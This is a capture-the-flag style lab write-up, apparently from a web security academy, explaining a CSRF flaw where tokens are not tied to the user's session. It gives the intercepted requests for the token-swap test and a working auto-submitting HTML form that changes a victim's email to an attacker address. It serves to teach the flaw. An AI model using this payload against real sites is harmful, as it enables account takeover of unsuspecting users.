## Lab 04: CSRF Where Token Is Not Tied to User Session
 
**Technique:** CSRF by reusing a valid token from a different user's session
**Target:** Email change functionality
**Status:** Solved
 
### Context
 
The application had CSRF tokens and validated them correctly, but the tokens were issued from a global pool rather than being bound to a specific authenticated session. This means a valid token from one user account could be used in a request made under a completely different user's session.
 
### What I Did
 
Two accounts were available for this lab: wiener and carlos.
 
I logged in as wiener, triggered an email change, intercepted the POST, and copied the CSRF token without forwarding the request (so the token was never consumed):
 
```
POST /my-account/change-email
 
email=test1@gmail.com
csrf=<wiener_token>
```
 
Then in a separate browser I logged in as carlos, triggered his own email change, and intercepted his POST in Repeater:
 
```
POST /my-account/change-email
 
email=test2@gmail.com
csrf=<carlos_token>
```
 
I replaced carlos's CSRF token with wiener's token and forwarded the request. Server accepted it. Carlos's email was changed using wiener's token.
 
This confirmed that tokens were not session-bound. They were valid globally regardless of who generated them.
 
To build the exploit I grabbed a fresh unused token from wiener's account and hardcoded it into the payload:
 
```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim@attacker.net">
    <input type="hidden" name="csrf" value="<fresh_token>">
</form>
 
<script>
document.forms[0].submit();
</script>
```
 
The victim's browser submits this form. It sends the victim's session cookie (which authenticates them) alongside the attacker's CSRF token (which passes validation). Server accepts it. Lab solved.
 
### Why This Works
 
A CSRF token only provides protection if it is tied to the specific user session making the request. If a token is just a random value that any authenticated user can generate and any other authenticated user can consume, then an attacker who has their own account can generate a valid token and embed it in the exploit. The victim's session authenticates the request, the attacker's token satisfies the CSRF check, and the server has no way to detect that something is wrong.
 
---
 
